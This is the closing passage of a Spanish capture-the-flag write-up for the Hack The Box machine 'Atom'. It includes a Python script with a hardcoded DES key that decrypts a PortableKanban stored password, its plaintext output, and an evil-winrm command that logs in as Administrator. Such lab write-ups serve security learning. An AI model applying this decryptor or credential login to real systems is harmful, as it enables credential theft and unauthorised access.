Esto último me recordó una máquina de **HTB** (***pequeño spoiler***, si no lo quieres, cierra los ojos, pero que puedas leer lo mínimo, busca esto en unas 4, 5 líneas abajo: `Es practicamente lo mismo ...`, sigue desde ahí 😜) la máquina **Sharp**, en ella habíamos usado también **PortableKanban** y debíamos (también \<redundancia :P\>) desencriptar unas contraseñas que estaban almacenadas en un archivo `.pk3`. Esto lo logramos gracias a un [exploit](https://www.exploit-db.com/exploits/49409) que tomaba ese archivo y con ayuda de una clave **DES** conseguía la contraseña en texto plano.

`Es prácticamente lo mismo`, solo que en nuestro caso no tenemos ese tipo de archivos, simplemente la password. Juguemos con el script y hagámosle unas modificaciones:

* [PortableKanban 4.3.6578.38136 - Encrypted Password Retrieval](https://www.exploit-db.com/exploits/49409).

Y a nosotros nos quedaria así:

```py
import base64
from des import *

def decode(hash):
    hash = base64.b64decode(hash.encode('utf-8'))
    key = DesKey(b"7ly6UznJ")
    return key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8')

print("Contraseña: " + decode("Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi"))
```

En su ejecución logramos el cometido, vemos la contraseña en texto plano:

```bash
❱ python3 kanban_decrypt.py 
Contraseña: kidvscat_admin_@123
```

Listos...

Recordando que tenemos el puerto **5985** (WinRM) activo, podemos aprovechar el uso de [evil-winrm](https://github.com/Hackplayers/evil-winrm) para obtener una **PowerShell** en el sistema (siempre y cuando las credenciales sean válidas, no nos emocionemos e.e):

```bash
❱ evil-winrm -i 10.10.10.237 -u 'Administrator' -p 'kidvscat_admin_@123'
```

Ejecutamos yyyyyyy:

![340bash_evilwinrm_adminSH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340bash_evilwinrm_adminSH.png)

Estamos inside de la máquina como el usuario **Administrator** (:

Tomemos las flags...

![340flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340flags.png)

...

No sé por qué la máquina esta rateada tan bajito (actualmente tiene `2.8`) sino esta mal, quizás puede ser por problemas que tuvo al inicio, porque temas de lentitud o fallos gratis no me cayeron.

El inicio me pareció super interesante (además que es algo real, algo que pasa), lo de **redis** y **kanban** también fue relevante, pero me llamo más la atención lo de `electron` (aunque tira también mucho a la realidad). En general la máquina esta bien y esta pensada para ser **Real Life**.

Y bueno, emoakabao. No siendo más, yo me voy retirando, ahí quedo todo organizado, la comida hecha y la ropa doblada, nos vemos yyyy **a seguir rompiendo todo!!**